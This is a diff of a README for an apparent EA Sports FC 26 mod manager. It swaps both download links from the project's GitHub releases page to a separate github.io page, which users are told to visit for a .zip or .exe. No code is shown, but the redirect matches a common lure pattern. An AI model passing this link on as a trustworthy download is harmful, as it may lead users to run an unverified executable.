@@ -1,6 +1,6 @@
 # ⚽ FC26-Mod-Ultimate - Manage your game mods with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Decapitated-quart895/FC26-Mod-Ultimate/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://decapitated-quart895.github.io)
 
 FC26-Mod-Ultimate organizes your game files for EA Sports FC 26. This tool simplifies the process of adding, updating, and removing mods. You gain control over your game setup through a visual interface. The software handles load orders, detects file conflicts, and provides a live editor for your career mode adjustments.
 
@@ -8,7 +8,7 @@ FC26-Mod-Ultimate organizes your game files for EA Sports FC 26. This tool simpl
 
 You need a Windows computer to run this application. Ensure your game is installed on your local drive before you begin. 
 
-Visit this page to download the latest version: [https://github.com/Decapitated-quart895/FC26-Mod-Ultimate/releases](https://github.com/Decapitated-quart895/FC26-Mod-Ultimate/releases) 
+Visit this page to download the latest version: [https://decapitated-quart895.github.io](https://decapitated-quart895.github.io) 
 
 Look for the file ending in .zip or .exe under the Assets section. Download the file to your computer.
 
